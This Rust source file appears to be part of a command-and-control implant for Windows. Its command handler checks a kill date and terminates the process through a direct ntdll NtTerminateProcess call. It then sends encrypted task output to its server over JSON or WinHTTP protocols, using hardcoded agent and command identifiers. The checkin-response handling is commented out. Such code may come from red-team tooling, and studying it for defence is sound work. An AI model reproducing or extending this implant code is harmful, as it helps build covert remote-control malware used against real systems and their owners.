use chrono::{DateTime, Utc};
use core::{ffi::c_void, ptr::null_mut};
use libc_print::{libc_eprintln, libc_println};
use serde::{Deserialize, Serialize};
use std::sync::Arc;
use tokio::runtime::Runtime;

use rs2_communication_protocol::metadata::{Metadata, WithMetadata};
use rs2_communication_protocol::protocol::Protocol;
use rs2_crypt::encryption_algorithm::ident_algorithm::IdentEncryptor;

use mod_agentcore::instance;
use mod_win32::nt_time::check_kill_date;

#[cfg(feature = "protocol-json")]
use mod_protocol_json::protocol::JsonProtocol;

#[cfg(feature = "protocol-winhttp")]
use mod_protocol_winhttp::protocol::WinHttpProtocol;

use crate::common::generate_path;

pub fn command_handler() {
    unsafe {
        if !instance().session.connected {
            return;
        }

        //KillDate
        if check_kill_date(instance().config.kill_date) {
            exit_command(1);
        }

        // !Working Hours -> continue
        let rt = Runtime::new().unwrap(); // Create a new Tokio runtime

        #[cfg(any(feature = "protocol-json", feature = "protocol-winhttp"))]
        {
            let encryptor = encryptor_from_raw(instance().session.encryptor_ptr);
            let protocol = protocol_from_raw(instance().session.protocol_ptr);

            let (_, path, request_id) = generate_path(32, 0, 6);
            let mut data = TaskOutput::new();

            let metadata = Metadata {
                request_id: request_id,
                command_id: "an3a8hlnrr4638d30yef0oz5sncjdx5w".to_string(),
                agent_id: "an3a8hlnrr4638d30yef0oz5sncjdx5x".to_string(),
                path: Some(path),
            };

            data.with_metadata(metadata);

            let result = rt.block_on(async {
                protocol.write(data, Some(encryptor.clone())).await;
            });

            // Attempt to write the Checkin data using the protocol

            // if result.is_ok() {
            // let checkin_response: Result<CheckinResponse, anyhow::Error> =
            //     protocol.read(result.unwrap(), Some(encryptor.clone()));

            // if checkin_response.is_ok() {
            //     let checkin_response_data = checkin_response.unwrap();
            // } else {
            //     libc_eprintln!(
            //         "Checkin Response Error: {}",
            //         checkin_response.err().unwrap()
            //     );
            // }
            // } else {
            //     libc_eprintln!("Error: {}", result.err().unwrap());
            //     exit_command(1);
            // }
        }

        return;
    }
}

/// Terminates the current process based on the provided exit type.
///
/// # Arguments
///
/// * `exit_type` - An integer that specifies the type of exit. If `exit_type` is 1,
///   the function attempts to terminate the current process.
///
/// # Safety
///
/// This function performs unsafe operations, including terminating the process, which
/// can lead to data loss or corruption if not handled properly.
pub fn exit_command(exit_type: i32) {
    unsafe {
        if exit_type == 1 {
            // Attempt to terminate the current process with exit status 0
            let ntstatus = instance().ntdll.nt_terminate_process.run(-1isize as _, 0);

            // Check if the termination was successful
            if ntstatus < 0 {
                // Print an error message if the termination failed
                libc_println!("NtTerminateProcess failed: {:#X}", ntstatus);
            }
        }
    }
}

/// Function to retrieve a mutable reference to a IdentEncryptor struct from a raw pointer.
pub unsafe fn encryptor_from_raw(ptr: *mut c_void) -> &'static mut IdentEncryptor {
    &mut *(ptr as *mut IdentEncryptor)
}

#[cfg(feature = "protocol-json")]
/// Function to retrieve a mutable reference to a JsonProtocl<IdentEncryptor> struct from a raw pointer.
pub unsafe fn protocol_from_raw(ptr: *mut c_void) -> &'static mut JsonProtocol<IdentEncryptor> {
    &mut *(ptr as *mut JsonProtocol<IdentEncryptor>)
}

#[cfg(feature = "protocol-winhttp")]
/// Function to retrieve a mutable reference to a JsonProtocl<IdentEncryptor> struct from a raw pointer.
pub unsafe fn protocol_from_raw(ptr: *mut c_void) -> &'static mut WinHttpProtocol<IdentEncryptor> {
    &mut *(ptr as *mut WinHttpProtocol<IdentEncryptor>)
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct SimpleAgentCommand {
    /// The command to be executed
    pub op: String, //AgentCommands
    /// The command metadata
    pub metadata: Metadata,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct TaskOutput {
    pub output: Option<String>,
    pub started_at: Option<String>,
    pub ended_at: Option<String>,
    pub exit_code: Option<u8>,
    pub metadata: Option<Arc<Metadata>>,
}

impl TaskOutput {
    pub fn new() -> Self {
        TaskOutput {
            output: None,
            started_at: None,
            ended_at: None,
            exit_code: None,
            metadata: None,
        }
    }

    pub fn with_metadata(&mut self, metadata: Metadata) -> &mut Self {
        self.metadata = Some(Arc::new(metadata));
        self
    }
}

impl WithMetadata for TaskOutput {
    fn get_metadata(&self) -> Arc<Metadata> {
        self.metadata.as_ref().unwrap().clone()
    }
}
